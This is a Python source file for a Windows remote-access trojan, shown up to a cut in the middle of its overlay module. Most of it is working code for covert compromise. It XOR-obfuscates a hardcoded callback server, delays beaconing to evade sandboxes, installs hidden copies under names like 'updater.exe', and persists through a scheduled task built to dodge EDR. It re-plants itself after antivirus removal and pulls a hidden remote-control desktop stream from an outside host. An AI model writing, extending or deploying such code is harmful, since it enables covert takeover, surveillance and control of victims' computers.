#!/usr/bin/env python3
"""
client.py - Reverse TCP implant with persistence (remote command execution only)
Configure LHOST / LPORT below.
"""

import socket
import subprocess
import os
import sys
import time
import random
import shutil
import threading
import glob
import zipfile
import urllib.request

try:
    from _build_id import BUILD_ID
except Exception:
    BUILD_ID = "0"


def _x(h: str, key: int = 0x4D) -> str:
    """Decode a hex-XOR string (keeps tell-tale literals out of the binary)."""
    return bytes(int(h[i:i + 2], 16) ^ key for i in range(0, len(h), 2)).decode()


# ===== CONFIG =====
LHOST = _x("78637f7e7c637b7c637c7979")   # 5.231.61.144
LPORT = 4444             # Your listener port
RECONNECT_DELAY = 5      # Seconds before reconnect attempt
# (min, max) seconds to sleep before the first beacon (sandbox / static-
# behavior evasion). Set to (0, 0) to disable; RAT_FAST=1 bypasses it.
PRE_CONNECT_SLEEP = (30, 90)
# ==================

BUFFER = 4096
MARKER = _x("77770803097777").encode()   # ::END::

# ===== PERSISTENCE CONFIG (Windows) =====
INSTALL_DIR_NAME = _x("632e2c2e2528")   # .cache
# Candidate names, tried in order. First one that installs wins.
INSTALL_NAME_CANDIDATES = [
    _x("3f38233924202863283528"),   # runtime.exe
    _x("383d292c39283f63283528"),   # updater.exe
    _x("2528213d283f63283528"),   # helper.exe
]
REG_RUN_PATH = _x("1e222b393a2c3f281100242e3f223e222b39111a242329223a3e110e383f3f2823391b283f3e242223111f3823")
# "task" = scheduled task, on-logon trigger (lower behavioral weight
#           than a Run key); "run" = legacy HKCU Run key. Task mode
#           falls back to the Run key if the task cannot be registered.
PERSIST_MODE = _x("392c3e26")   # "task"
SCHTASK_NAME = _x("1f382339242028183d292c3928192c3e26")   # RuntimeUpdateTask
# =======================================


def _base_dir() -> str:
    """Base dir for install + runtime files: %USERPROFILE% root so the
    implant never writes to %TEMP% or %APPDATA% (both are heavily watched
    by AV/EDR). Falls back to %APPDATA% if USERPROFILE is unset."""
    return os.environ.get("USERPROFILE") or os.environ.get("APPDATA") or ""


def _module_exe_path() -> str:
    r"""Real on-disk path of the current process image (ctypes only).

    Nuitka onefile re-executes the same exe for the inner payload but
    fabricates sys.executable to a non-existent python.exe in the
    %TEMP%\onefile_* extraction dir. GetModuleFileNameW(NULL) returns
    the actual process image path, which always exists on disk.
    """
    try:
        import ctypes
        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        buf = ctypes.create_unicode_buffer(4096)
        n = kernel32.GetModuleFileNameW(None, buf, len(buf))
        if n:
            return buf.value
    except Exception:
        pass
    return ""


def get_self_path() -> str:
    r"""Path of the running executable (works frozen and as .py).

    Nuitka does NOT set sys.frozen; detect it via the __compiled__
    marker. In onefile mode use the process image path instead of the
    fabricated sys.executable so the file exists on disk.
    """
    if getattr(sys, "frozen", False) or "__compiled__" in globals():
        p = _module_exe_path()
        if p:
            return p
        return os.path.abspath(sys.executable)
    return os.path.abspath(__file__)


def hide_path(path: str) -> None:
    """Set the hidden+system attribute on a file or folder (Windows)."""
    if os.name != "nt":
        return
    try:
        subprocess.run(
            ["attrib", "+h", "+s", path],
            creationflags=subprocess.CREATE_NO_WINDOW,
            timeout=10,
        )
    except Exception:
        pass


def make_run_key_name(file_name: str) -> str:
    """Derive a Run key value name from the installed file name."""
    return os.path.splitext(file_name)[0].capitalize()


def try_install(install_dir: str, file_name: str, self_path: str):
    """
    Attempt to install under file_name. Returns full path on success,
    None if the name is taken by a locked file.
    """
    install_path = os.path.join(install_dir, file_name)

    # Already running from this exact path -> nothing to do
    if os.path.abspath(self_path).lower() == os.path.abspath(install_path).lower():
        return install_path

    # Delete any existing file at the target path first
    if os.path.exists(install_path):
        try:
            os.remove(install_path)   # replace stale/old copy
        except OSError:
            return None               # locked -> caller tries next name

    try:
        os.makedirs(install_dir, exist_ok=True)
        shutil.copy2(self_path, install_path)
    except Exception:
        return None

    return install_path


def _current_is_installed() -> bool:
    """True if we are already running from the hidden install dir."""
    root = _base_dir()
    if not root:
        return False
    self_path = os.path.abspath(get_self_path()).lower()
    return any(self_path == os.path.abspath(
        os.path.join(root, INSTALL_DIR_NAME, n)).lower()
        for n in INSTALL_NAME_CANDIDATES)


def _process_paths() -> set:
    """Full paths of all running processes, via ctypes only (no script
    engine -> no PowerShell/CIM telemetry in the guard loop)."""
    paths = set()
    try:
        import ctypes
        from ctypes import wintypes
        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        psapi = ctypes.WinDLL("psapi", use_last_error=True)

        enum = psapi.EnumProcesses
        PDWORD = ctypes.POINTER(wintypes.DWORD)
        enum.argtypes = (PDWORD, wintypes.DWORD, wintypes.LPDWORD)
        enum.restype = wintypes.BOOL
        query = kernel32.QueryFullProcessImageNameW
        query.argtypes = (wintypes.HANDLE, wintypes.DWORD,
                          wintypes.LPWSTR, wintypes.LPDWORD)
        query.restype = wintypes.BOOL
        openp = kernel32.OpenProcess
        openp.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)
        openp.restype = wintypes.HANDLE

        size = 8192
        while True:
            buf = (wintypes.DWORD * (size // 4))()
            needed = wintypes.DWORD()
            if not enum(ctypes.cast(buf, PDWORD), ctypes.sizeof(buf),
                        ctypes.byref(needed)):
                if ctypes.get_last_error() == 122 and size < (1 << 16):
                    size *= 2
                    continue
                return paths
            break
        count = needed.value // ctypes.sizeof(wintypes.DWORD)
        for pid in buf[:count]:
            if not pid:
                continue
            h = openp(0x1000, False, pid)   # PROCESS_QUERY_LIMITED_INFORMATION
            if not h:
                continue
            try:
                cap = wintypes.DWORD(4096)
                path = ctypes.create_unicode_buffer(4096)
                if query(h, 0, path, ctypes.byref(cap)):
                    paths.add(path.value.lower())
            finally:
                kernel32.CloseHandle(h)
    except Exception:
        pass
    return paths


def _installed_running() -> bool:
    """True if an installed candidate exe (EXACT path) is running.

    Exact-match only: in Nuitka onefile mode the inner payload re-executes
    from the extraction dir ({USERPROFILE}\\.cache\\rt\\...), so prefix-
    matching the install dir would make the very first run see itself as
    already installed and exit before installing. Only the original exe
    path (parent image) ever equals an installed candidate.
    """
    if os.name != "nt":
        return False
    root = _base_dir()
    if not root:
        return False
    try:
        running = _process_paths()
        return any(
            os.path.abspath(os.path.join(root, INSTALL_DIR_NAME, n)).lower()
            in running for n in INSTALL_NAME_CANDIDATES)
    except Exception:
        return False


def _parent_pid() -> int:
    """PID of the parent process (Toolhelp32 snapshot, ctypes only)."""
    try:
        import ctypes
        from ctypes import wintypes
        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

        class PROCESSENTRY32W(ctypes.Structure):
            _fields_ = [
                ("dwSize", wintypes.DWORD),
                ("cntUsage", wintypes.DWORD),
                ("th32ProcessID", wintypes.DWORD),
                ("th32DefaultHeapID", ctypes.POINTER(wintypes.ULONG)),
                ("th32ModuleID", wintypes.DWORD),
                ("cntThreads", wintypes.DWORD),
                ("th32ParentProcessID", wintypes.DWORD),
                ("pcPriClassBase", ctypes.c_long),
                ("dwFlags", wintypes.DWORD),
                ("szExeFile", ctypes.c_wchar * 260),
            ]

        snap = kernel32.CreateToolhelp32Snapshot(0x2, 0)   # TH32CS_SNAPPROCESS
        if not snap or snap == -1:
            return 0
        try:
            pe = PROCESSENTRY32W()
            pe.dwSize = ctypes.sizeof(PROCESSENTRY32W)
            if not kernel32.Process32FirstW(snap, ctypes.byref(pe)):
                return 0
            my_pid = os.getpid()
            while True:
                if pe.th32ProcessID == my_pid:
                    return int(pe.th32ParentProcessID)
                if not kernel32.Process32NextW(snap, ctypes.byref(pe)):
                    return 0
        finally:
            kernel32.CloseHandle(snap)
    except Exception:
        return 0


def _pid_image_path(pid: int) -> str:
    """Full image path of a process by PID (ctypes only)."""
    try:
        import ctypes
        from ctypes import wintypes
        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        openp = kernel32.OpenProcess
        openp.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)
        openp.restype = wintypes.HANDLE
        query = kernel32.QueryFullProcessImageNameW
        query.argtypes = (wintypes.HANDLE, wintypes.DWORD,
                          wintypes.LPWSTR, wintypes.LPDWORD)
        query.restype = wintypes.BOOL

        h = openp(0x1000, False, pid)   # PROCESS_QUERY_LIMITED_INFORMATION
        if not h:
            return ""
        try:
            cap = wintypes.DWORD(4096)
            buf = ctypes.create_unicode_buffer(4096)
            if query(h, 0, buf, ctypes.byref(cap)):
                return buf.value
        finally:
            kernel32.CloseHandle(h)
    except Exception:
        pass
    return ""


def _parent_is_installed() -> bool:
    """True if our parent process image is an installed candidate.

    Nuitka onefile: the parent (bootstrapper) image is the original exe
    path, the child image is the extraction dir. So an installed copy
    launched at logon shows up as parent=~\\.cache\\helper.exe with the
    running payload as its child. If our parent is an installed candidate
    we ARE that payload and must connect, not exit.
    """
    if os.name != "nt":
        return False
    root = _base_dir()
    if not root:
        return False
    ppath = _pid_image_path(_parent_pid()).lower()
    if not ppath:
        return False
    return any(
        ppath == os.path.abspath(
            os.path.join(root, INSTALL_DIR_NAME, n)).lower()
        for n in INSTALL_NAME_CANDIDATES)


def _set_run_key(file_name: str, install_path: str) -> None:
    """(Re)create the HKCU Run entry for the installed copy."""
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_RUN_PATH, 0,
                             winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, make_run_key_name(file_name), 0,
                          winreg.REG_SZ, install_path)
        winreg.CloseKey(key)
    except Exception:
        pass


def _variant_type():
    """ctypes.VARIANT is absent on some Windows builds - define it.
    Zero-initialised VARIANT is a valid VT_EMPTY."""
    import ctypes
    vt = getattr(ctypes, "VARIANT", None)
    if vt is not None:
        return vt

    class _VARIANT(ctypes.Structure):   # 16 B x86 / 24 B x64
        _fields_ = [("vt", ctypes.c_ushort), ("r1", ctypes.c_ushort),
                    ("r2", ctypes.c_ushort), ("r3", ctypes.c_ushort),
                    ("ptr", ctypes.c_void_p), ("tail", ctypes.c_void_p)]

    ctypes.VARIANT = _VARIANT
    return _VARIANT


def _com_slot(ptr, idx, *atypes):
    """Build a callable for vtable slot `idx` of a raw COM interface ptr."""
    import ctypes
    vtbl = ctypes.cast(ptr, ctypes.POINTER(ctypes.c_void_p))[0]
    addr = ctypes.c_void_p.from_address(
        vtbl + idx * ctypes.sizeof(ctypes.c_void_p)).value
    return ctypes.WINFUNCTYPE(ctypes.HRESULT, ctypes.c_void_p,
                              *atypes)(addr)


def _com_release(ptr) -> None:
    import ctypes
    try:
        p = ptr.value if isinstance(ptr, ctypes.c_void_p) else ptr
        if p:
            _com_slot(p, 2)(p)   # IUnknown::Release
    except Exception:
        pass


def _ts_open():
    """Open the local Task Scheduler service fully in-process.

    Returns (service, root_folder) raw COM pointers or None. All calls
    are vtable-indexed; taskschd interfaces are IDispatch-derived, so
    custom methods start at slot 7:
      ITaskService: GetFolder=7, Connect=10
      ITaskFolder:  GetTask=13, RegisterTask=16
    """
    import ctypes
    ole32 = ctypes.oledll.ole32
    try:
        ole32.CoInitializeEx(None, 0)       # COINIT_APARTMENTTHREADED
    except OSError:
        pass                                # already initialised
    svc = ctypes.c_void_p()
    try:
        import uuid
        # GUID memory layout == uuid.bytes_le (16-byte buffer is a valid
        # CLSID/IID pointer)
        clsid = ctypes.create_string_buffer(
            uuid.UUID("{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}").bytes_le, 16)
        iid = ctypes.create_string_buffer(
            uuid.UUID("{2FABA4C7-4DA9-4013-9697-20CC3FD40F85}").bytes_le, 16)
        ole32.CoCreateInstance(
            ctypes.byref(clsid),
            None, 1,                       # CLSCTX_INPROC_SERVER
            ctypes.byref(iid),
            ctypes.byref(svc))
    except OSError:
        return None
    if not svc.value:
        return None
    try:
        VARIANT = _variant_type()
        connect = _com_slot(svc, 10,
                            ctypes.POINTER(VARIANT),
                            ctypes.POINTER(VARIANT),
                            ctypes.POINTER(VARIANT),
                            ctypes.POINTER(VARIANT))
        empty = VARIANT()
        if connect(svc, ctypes.byref(empty), ctypes.byref(empty),
                   ctypes.byref(empty), ctypes.byref(empty)) != 0:
            return None
        folder = ctypes.c_void_p()
        getf = _com_slot(svc, 7, ctypes.c_wchar_p,
                         ctypes.POINTER(ctypes.c_void_p))
        if getf(svc, ctypes.c_wchar_p("\\"),
                ctypes.byref(folder)) != 0 or not folder.value:
            return None
        return svc, folder
    except Exception:
        return None


def _ts_release(svc, folder) -> None:
    for p in (folder, svc):
        _com_release(p)


def _create_task(install_path: str) -> None:
    """Register a per-user 'on logon' scheduled task.

    Done entirely in-process via the Task Scheduler COM API (ctypes
    vtable calls) - no powershell.exe / schtasks.exe child is ever
    spawned, so behavioural detections on hidden PowerShell task
    creation have nothing to trigger on. RegisterTask (the same COM
    API PowerShell wraps) is allowed for standard users, unlike
    schtasks /sc onlogon.
    """
    try:
        import ctypes
        import xml.sax.saxutils as _sx
        handles = _ts_open()
        if not handles:
            return
        svc, folder = handles
        try:
            uid = _sx.escape("%s\\%s" % (os.environ.get("USERDOMAIN", ""),
                                          os.environ.get("USERNAME", "")))
            xml = (
                '<?xml version="1.0" encoding="UTF-16"?>'
                '<Task version="1.2" '
                'xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">'
                '<Triggers><LogonTrigger><UserId>%s</UserId></LogonTrigger></Triggers>'
                '<Principals><Principal id="Author"><UserId>%s</UserId>'
                '<LogonType>InteractiveToken</LogonType></Principal></Principals>'
                '<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>'
                '<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>'
                '<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>'
                '<ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>'
                '<Actions Context="Author"><Exec><Command>%s</Command></Exec></Actions>'
                '</Task>'
            ) % (uid, uid, _sx.escape(install_path))
            VARIANT = _variant_type()
            reg = _com_slot(folder, 16,
                            ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_long,
                            ctypes.POINTER(VARIANT),
                            ctypes.POINTER(VARIANT),
                            ctypes.c_long, ctypes.POINTER(VARIANT),
                            ctypes.POINTER(ctypes.c_void_p))
            out = ctypes.c_void_p()
            v = VARIANT()
            reg(folder, ctypes.c_wchar_p(SCHTASK_NAME), xml, 6,
                ctypes.byref(v), ctypes.byref(v), 3, ctypes.byref(v),
                ctypes.byref(out))     # TASK_CREATE_OR_UPDATE / INTERACTIVE_TOKEN
            _com_release(out)
        finally:
            _ts_release(svc, folder)
    except Exception:
        pass


def _task_active() -> bool:
    """True if the scheduled task exists (in-process COM, no schtasks)."""
    try:
        import ctypes
        handles = _ts_open()
        if not handles:
            return False
        svc, folder = handles
        try:
            get = _com_slot(folder, 13, ctypes.c_wchar_p,
                            ctypes.POINTER(ctypes.c_void_p))
            out = ctypes.c_void_p()
            ok = get(folder, ctypes.c_wchar_p(SCHTASK_NAME),
                     ctypes.byref(out)) == 0
            _com_release(out)
            return ok
        finally:
            _ts_release(svc, folder)
    except Exception:
        return False


def _ensure_persistence(file_name: str, install_path: str) -> None:
    """(Re)create the autostart entry (task by default, Run key fallback)."""
    if PERSIST_MODE == _x("392c3e26"):   # "task"
        _create_task(install_path)
        if not _task_active():
            _set_run_key(file_name, install_path)   # fallback
    else:
        _set_run_key(file_name, install_path)


def install_persistence() -> None:
    """
    Install self under a hidden user-writable folder with a HKCU Run key.
    - Deletes any existing file at the target path first; falls back to
      the next candidate name if a file is locked.
    - Only exits (hand-off) AFTER the installed copy is confirmed alive.
      If AV kills the fresh copy within seconds, we keep running instead
      of dying into a dead file.
    User-level (mid-integrity) persistence - no admin required.
    """
    if os.name != "nt":
        return

    root = _base_dir()
    if not root:
        return
    install_dir = os.path.join(root, INSTALL_DIR_NAME)

    if _current_is_installed():
        return                      # already the installed copy
    if _installed_running():
        if _parent_is_installed():
            return                  # we are the installed copy's onefile payload
        sys.exit(0)                 # copy alive elsewhere; avoid double beacon

    install_path = None
    used_name = None
    for candidate in INSTALL_NAME_CANDIDATES:
        install_path = try_install(install_dir, candidate, get_self_path())
        if install_path:
            used_name = candidate
            break
    if not install_path:
        return                      # every candidate failed; bail quietly

    hide_path(install_dir)
    hide_path(install_path)
    _ensure_persistence(used_name, install_path)

    # Hand off ONLY after the copy is confirmed running
    try:
        p = subprocess.Popen(
            [install_path],
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
            close_fds=True,
        )
        time.sleep(3)
        if p.poll() is None:
            sys.exit(0)             # copy is alive -> safe to exit
        # copy died within 3s (quarantined?) -> keep running from here
    except Exception:
        pass


def _persistence_guard() -> None:
    """Background task: if the installed copy or autostart entry disappears
    (AV removal, manual deletion), re-plant it. Runs every 45 s."""
    if os.name != "nt":
        return
    root = _base_dir()
    if not root:
        return
    install_dir = os.path.join(root, INSTALL_DIR_NAME)
    while True:
        time.sleep(45)
        try:
            if _current_is_installed():
                continue            # we ARE the installed copy
            if _installed_running():
                # copy alive: make sure the autostart entry still points at it
                for candidate in INSTALL_NAME_CANDIDATES:
                    ip = os.path.join(install_dir, candidate)
                    if os.path.exists(ip):
                        _ensure_persistence(candidate, ip)
                        break
                continue
            # nothing running -> re-plant
            install_path = None
            used_name = None
            for candidate in INSTALL_NAME_CANDIDATES:
                install_path = try_install(install_dir, candidate, get_self_path())
                if install_path:
                    used_name = candidate
                    break
            if not install_path:
                continue
            hide_path(install_dir)
            hide_path(install_path)
            _ensure_persistence(used_name, install_path)
            subprocess.Popen(
                [install_path],
                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
                close_fds=True,
            )
        except Exception:
            continue


# ===== NETVNC STREAM (WebRTC desktop stream + remote control) =====
# Lazy pull of Node.js (official zip from nodejs.org/dist) + the netvnc
# desktop streamer bundle (werift/ffmpeg-static/ws + stream-video-script.js).
# Installs hidden under %USERPROFILE%\\.cache (same dir as the implant),
# runs detached + hidden. netvnc signaling/viewer/TURN already live on VPS.
STREAM_WS = _x("3a3e3e7762622328393b232e6335343f2c3e203e63232839623a3e")   # wss://netvnc.xyrasms.net/ws
VIEWER_BASE = _x("2539393d3e7762622328393b232e6335343f2c3e203e63232839")   # https://netvnc.xyrasms.net
NODE_ZIP_URL = _x("2539393d3e7762623f2c3a632a243925382f383e283f2e222339282339632e2220623a282c39282e252139296229223a2321222c293e62202c24236223222928603b7f7f637c79637d603a242360357b796337243d")   # GitHub raw node zip
BUNDLE_URL = _x("2539393d3e7762623f2c3a632a243925382f383e283f2e222339282339632e2220623a282c39282e252139296229223a2321222c293e62202c2423622328393b232e1229283e2639223d123a24237b796337243d")   # GitHub raw bundle
NODE_DIR = _x("233b23222928")     # nvnode
DESK_DIR = _x("233b29283e26")     # nvdesk
BUNDLE_NAME = _x("2328393b232e1229283e2639223d123a24237b796337243d")

_stream_state = {"popen": None, "phase": "idle", "room": "", "last_error": "",
                 "logf": None}


def _stream_dir(name: str) -> str:
    return os.path.join(_base_dir(), INSTALL_DIR_NAME, name)


def _node_exe():
    hits = glob.glob(os.path.join(_stream_state_path(), NODE_DIR, "**", "node.exe"),
                     recursive=True)
    return hits[0] if hits else None


def _stream_state_path() -> str:
    return os.path.join(_base_dir(), INSTALL_DIR_NAME)


def _download_to(url: str, dest: str) -> None:
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=120) as resp, open(dest, "wb") as f:
        while True:
            chunk = resp.read(1 << 20)
            if not chunk:
                break
            f.write(chunk)


def _extract_zip(zpath: str, dest: str) -> None:
    with zipfile.ZipFile(zpath) as z:
        z.extractall(dest)


def _spawn_hidden(argv, cwd=None, stdout=subprocess.DEVNULL,
                  stderr=subprocess.DEVNULL):
    """Detached, fully hidden process (no window, no console flash)."""
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = 0   # SW_HIDE
    return subprocess.Popen(
        argv,
        cwd=cwd,
        stdout=stdout,
        stderr=stderr,
        stdin=subprocess.DEVNULL,
        creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
        startupinfo=si,
        close_fds=True,
    )


def deploy_stream(room: str = "default") -> str:
    """Ensure Node + netvnc streamer bundle are installed (hidden under
    %USERPROFILE%\\.cache), then launch the WebRTC streamer detached.
    Remote control (mouse/keyboard via /control relay) is enabled."""
    if os.name != "nt":
        return "[!] stream: Windows only"

    def work():
        try:
            _stream_state["phase"] = "checking"
            base = os.path.join(_base_dir(), INSTALL_DIR_NAME)

            node = _node_exe()
            if not node:
                _stream_state["phase"] = "downloading node"
                nz = os.path.join(base, "nvnode.zip")
                _download_to(NODE_ZIP_URL, nz)
                hide_path(nz)
                nroot = os.path.join(base, NODE_DIR)
                os.makedirs(nroot, exist_ok=True)
                _extract_zip(nz, nroot)
                os.remove(nz)
                hide_path(nroot)
                node = _node_exe()
            if not node:
                _stream_state["last_error"] = "node.exe not found after install"
                _stream_state["phase"] = "failed"
                return

            desk = os.path.join(base, DESK_DIR)
            marker = os.path.join(desk, ".installed")
            script = os.path.join(desk, "stream-video-script.js")
            if not os.path.exists(script):
                _stream_state["phase"] = "downloading bundle"
                bz = os.path.join(base, BUNDLE_NAME)
                _download_to(BUNDLE_URL, bz)
                hide_path(bz)
                os.makedirs(desk, exist_ok=True)
                _extract_zip(bz, desk)
                os.remove(bz)
                open(marker, "w").close()
                hide_path(desk)
                hide_path(marker)
            if not os.path.exists(script):
                _stream_state["last_error"] = "stream-video-script.js missing from bundle"
                _stream_state["phase"] = "failed"
                return

            prev = _stream_state.get("popen")
            if prev is not None and prev.poll() is None:
                _stream_state["phase"] = "running"
                return                      # already streaming

            _stream_state["phase"] = "starting"
            logf = open(os.path.join(desk, "nvstream.log"), "w")
            _stream_state["logf"] = logf
            p = _spawn_hidden(
                [node, script,
                 "--stream-url", STREAM_WS,
                 "--room", room,
                 "--fps", "12",
                 "--allow-control"],
                cwd=desk,
                stdout=logf,
                stderr=subprocess.STDOUT,
            )
            time.sleep(2)
            if p.poll() is not None:
                _stream_state["last_error"] = f"streamer exited code={p.returncode}"
                _stream_state["phase"] = "failed"
                return
            # persist the pid so a later beacon (fresh process, no Popen
            # handle) can still stop the streamer without spawning any
            # powershell/CIM sweep
            try:
                with open(os.path.join(desk, "nvspid.txt"), "w") as fh:
                    fh.write(str(p.pid))
            except Exception:
                pass
            _stream_state.update(popen=p, pid=p.pid, room=room,
                                 phase="running", last_error="")
            _under_start()   # composite frame source for the streamer
        except Exception as e:
            _stream_state["last_error"] = str(e)
            _stream_state["phase"] = "failed"

    threading.Thread(target=work, daemon=True, name="nvstream").start()
    return f"[+] netvnc stream deploy started (room={room}, control=on)"


def stop_stream() -> str:
    killed = 0
    p = _stream_state.get("popen")
    if p is not None and p.poll() is None:
        try:
            subprocess.run(["taskkill", "/PID", str(p.pid), "/T", "/F"],
                           capture_output=True, timeout=15,
                           creationflags=subprocess.CREATE_NO_WINDOW)
            killed += 1
        except Exception:
            pass
    # belt-and-braces: also kill pids recorded on previous boots (a
    # beacon restart loses the Popen handle); no powershell/CIM spawn
    try:
        pf = os.path.join(_base_dir(), INSTALL_DIR_NAME, DESK_DIR, "nvspid.txt")
        if os.path.exists(pf):
            with open(pf, "r") as fh:
                old = (fh.read() or "").strip()
            try:
                os.remove(os.path.join(_base_dir(), INSTALL_DIR_NAME,
                                       DESK_DIR, "nvspid.txt"))
            except Exception:
                pass
            if old.isdigit():
                subprocess.run(["taskkill", "/PID", old, "/T", "/F"],
                               capture_output=True, timeout=15,
                               creationflags=subprocess.CREATE_NO_WINDOW)
                killed += 1
    except Exception:
        pass
    _stream_state.update(popen=None, pid=0, phase="stopped")
    return f"[+] stream stopped ({killed} tracked)"


def stream_log(lines: int = 100) -> str:
    """Tail the streamer log (node stdout+stderr incl. ffmpeg/ICE errors)."""
    path = os.path.join(_base_dir(), INSTALL_DIR_NAME, DESK_DIR, "nvstream.log")
    if not os.path.exists(path):
        return "[!] no stream log yet (stream never started on this boot)"
    try:
        with open(path, "r", errors="replace") as f:
            buf = f.read().splitlines()
        tail = buf[-lines:]
        return f"--- nvstream.log ({len(buf)} lines, showing {len(tail)}) ---\n" \
               + "\n".join(tail)
    except Exception as e:
        return f"[!] log read failed: {e}"


def stream_status() -> str:
    p = _stream_state.get("popen")
    room = _stream_state.get("room") or "default"
    if p is not None and p.poll() is None:
        line = f"netvnc stream: RUNNING pid={p.pid} room={room} control=on"
    elif _stream_state.get("phase") == "failed":
        line = "netvnc stream: FAILED"
    else:
        line = f"netvnc stream: not running (phase={_stream_state.get('phase')})"
    lines = [line]
    if _stream_state.get("last_error"):
        lines.append(f"last_error: {_stream_state['last_error']}")
    logp = os.path.join(_base_dir(), INSTALL_DIR_NAME, DESK_DIR, "nvstream.log")
    lines.append("log: " + (logp if os.path.exists(logp)
                            else "none yet (use: stream log after start)"))
    node = _node_exe()
    lines.append(f"node: {node if node else 'not installed'}")
    script = os.path.join(_base_dir(), INSTALL_DIR_NAME, DESK_DIR,
                          "stream-video-script.js")
    lines.append("bundle: " + ("OK " + os.path.dirname(script)
                                if os.path.exists(script) else "not installed"))
    lines.append(f"viewer: {VIEWER_BASE}/?room={room}")
    return "\n".join(lines)


# ===== OVERLAY / CURSOR / ELEVATION / POWER MODULE =====
_ov_state = {"thread": None, "hwnd": None, "black": False,
             "bits": None, "w": 0, "h": 0}
_ov_refs = {}
_pw_refs = {}


def _capture_screen() -> None:
    """One-shot GDI grab of the primary screen into a persistent BGRA
    top-down buffer (used to paint the overlay once, no refresh)."""
    import ctypes
    u32 = ctypes.windll.user32
    g32 = ctypes.windll.gdi32
    ctx = u32.SetThreadDpiAwarenessContext(ctypes.c_void_p(-4))  # per-monitor
    try:
        w = u32.GetSystemMetrics(0)
        h = u32.GetSystemMetrics(1)
    finally:
        if ctx:
            u32.SetThreadDpiAwarenessContext(ctx)
    if not w or not h:
        return

    class BMIH(ctypes.Structure):
        _fields_ = [("biSize", ctypes.c_uint), ("biWidth", ctypes.c_long),
                    ("biHeight", ctypes.c_long), ("biPlanes", ctypes.c_ushort),
                    ("biBitCount", ctypes.c_ushort),
                    ("biCompression", ctypes.c_uint),
                    ("biSizeImage", ctypes.c_uint), ("biXPels", ctypes.c_long),
                    ("biYPels", ctypes.c_long), ("biClrUsed", ctypes.c_uint),
                    ("biClrImportant", ctypes.c_uint)]

    class BMI(ctypes.Structure):
        _fields_ = [("bmiHeader", BMIH), ("bmiColors", ctypes.c_uint * 3)]

    bmi = BMI()
    bmi.bmiHeader.biSize = ctypes.sizeof(BMIH)
    bmi.bmiHeader.biWidth = w
    bmi.bmiHeader.biHeight = -h          # top-down
    bmi.bmiHeader.biPlanes = 1
    bmi.bmiHeader.biBitCount = 32
    hdc = u32.GetDC(None)
    mem = g32.CreateCompatibleDC(hdc)
    ptr = ctypes.c_void_p()
    sec = g32.CreateDIBSection(mem, ctypes.byref(bmi), 0,
                               ctypes.byref(ptr), None, 0)
    if sec and ptr.value:
        old = g32.SelectObject(mem, sec)
        g32.BitBlt(mem, 0, 0, w, h, hdc, 0, 0, 0x00CC0020)   # SRCCOPY
        g32.SelectObject(mem, old)
        buf = ctypes.create_string_buffer(w * h * 4)
        ctypes.memmove(buf, ptr, w * h * 4)
        _ov_state["bits"], _ov_state["w"], _ov_state["h"] = buf, w, h
    if sec:
        g32.DeleteObject(sec)
    if mem:
        g32.DeleteDC(mem)
    if hdc:
        u32.ReleaseDC(None, hdc)


def _overlay_run(black: bool) -> None:
    """Fullscreen NULL-cursor popup painted with the frozen screen (or
    solid black). Owns a message pump; ends on WM_CLOSE."""
    import ctypes
    u32 = ctypes.windll.user32
    g32 = ctypes.windll.gdi32
    u32.DefWindowProcW.restype = ctypes.c_ssize_t
    u32.DefWindowProcW.argtypes = (ctypes.c_void_p, ctypes.c_uint,
                                   ctypes.c_size_t, ctypes.c_ssize_t)

    WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_void_p,
                                 ctypes.c_uint, ctypes.c_size_t,
                                 ctypes.c_ssize_t)
    WM_PAINT, WM_DESTROY = 0x0F, 0x02

    class RECT(ctypes.Structure):
        _fields_ = [("l", ctypes.c_long), ("t", ctypes.c_long),
                    ("r", ctypes.c_long), ("b", ctypes.c_long)]

    class POINT(ctypes.Structure):
        _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

    class PAINTSTRUCT(ctypes.Structure):
        _fields_ = [("hdc", ctypes.c_void_p), ("fErase", ctypes.c_int),
                    ("rcPaint", RECT), ("fRestore", ctypes.c_int),
                    ("fIncUpdate", ctypes.c_int),
                    ("rgbReserved", ctypes.c_byte * 32)]

    class MSG(ctypes.Structure):
        _fields_ = [("hwnd", ctypes.c_void_p), ("message", ctypes.c_uint),
                    ("wParam", ctypes.c_size_t), ("lParam", ctypes.c_ssize_t),
                    ("time", ctypes.c_uint), ("pt", POINT)]

    class WNDCLASSW(ctypes.Structure):
        _fields_ = [("style", ctypes.c_uint), ("lpfnWndProc", WNDPROC),
                    ("cbClsExtra", ctypes.c_int), ("cbWndExtra", ctypes.c_int),
                    ("hInstance", ctypes.c_void_p), ("hIcon", ctypes.c_void_p),
                    ("hCursor", ctypes.c_void_p),
                    ("hbrBackground", ctypes.c_void_p),
                    ("lpszMenuName", ctypes.c_wchar_p),
                    ("lpszClassName", ctypes.c_wchar_p)]

    class BMIH(ctypes.Structure):
        _fields_ = [("biSize", ctypes.c_uint), ("biWidth", ctypes.c_long),
                    ("biHeight", ctypes.c_long), ("biPlanes", ctypes.c_ushort),
                    ("biBitCount", ctypes.c_ushort),
                    ("biCompression", ctypes.c_uint),
